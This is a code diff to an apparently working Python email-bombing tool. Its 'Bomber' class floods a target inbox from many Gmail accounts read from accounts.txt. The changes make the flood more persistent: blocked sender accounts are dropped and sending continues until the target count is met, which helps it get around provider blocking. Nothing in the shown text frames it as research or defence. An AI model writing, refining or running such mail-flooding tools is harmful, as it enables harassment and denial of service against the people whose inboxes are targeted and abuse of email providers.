@@ -5,7 +5,7 @@ import smtplib
 
 from essential_generators import DocumentGenerator
 
-##ACCOUNTS.TXT FILE MUST CONTAIN GMAIL ACCOUNTS THAT HAVE NFA AND ACCESS TO LESS SECURE APPS ENABLED
+#ACCOUNTS.TXT FILE MUST CONTAIN GMAIL ACCOUNTS THAT HAVE NFA AND ACCESS TO LESS SECURE APPS ENABLED
 
 class Bomber:
     '''This is the bomber class that contains email-bombing functions and methods'''
@@ -25,7 +25,7 @@ class Bomber:
             self.random_appendage = Bomber.prompt('''[PROMPT] Press (1) to append a random word at the end of the subject of each message, or press (2) to decline this. The former is suggested: ''')
         with open("bomber/accounts.txt", "r") as infile:
             data = [line.rstrip().split(":") for line in infile]
-            self.sending_email, self.sending_passwd = zip(*data)
+            self.sending_email, self.sending_passwd = map(list, zip(*data))
 
 
     def start(self):
@@ -34,12 +34,19 @@ class Bomber:
 
 
     def random_sending(self):
-        for i in range(self.max_num_emails):
-            rand_ind = randint(1, len(self.sending_email)) - 1
-            if isinstance(Bomber.send(self, self.sending_email[rand_ind], self.sending_passwd[rand_ind]), int):
-                print("\nBlocked {}".format(self.sending_email[rand_ind])) #debug
-            print("[{}/{}] total emails have been sent. The current email is {}".format(i + 1, self.max_num_emails, self.sending_email[self.account_ind]), end = '\r')
-        print("\nDONE !!!")
+      not_finished = True
+      num_sent = 0
+      while not_finished:
+          rand_ind = randint(0, len(self.sending_email) - 1)
+          if isinstance(Bomber.send(self, self.sending_email[rand_ind], self.sending_passwd[rand_ind]), int):
+              print(f"Blocked {self.sending_email[rand_ind]}") #debug
+              print(f"Removing {self.sending_email.pop(rand_ind)} from the list")
+          else:
+            num_sent += 1
+            curr_email = self.sending_email[rand_ind]
+            print(f"[{num_sent}/{self.max_num_emails}] total emails have been sent. The current email is {curr_email}")
+            if num_sent >= self.max_num_emails: not_finished = False
+      print("\nDONE !!!")
 
     #sequentially iterates over the accounts.txt and swtiches only when SMTP connection gets closed
     def linear_sending(self):
@@ -49,7 +56,8 @@ class Bomber:
                     self.account_ind += 1
                 else:
                     self.account_ind = 0
-            print("[{}/{}] total emails have been sent. The current email is {}".format(i + 1, self.max_num_emails, self.sending_email[self.account_ind]), end = '\r')
+            curr_email = self.sending_email[self.account_ind]
+            print(f"[{i + 1}/{self.max_num_emails}] total emails have been sent. The current email is {curr_email}")
         print("\nDONE !!!")
 
     def send(self, sending_email, sending_passwd):
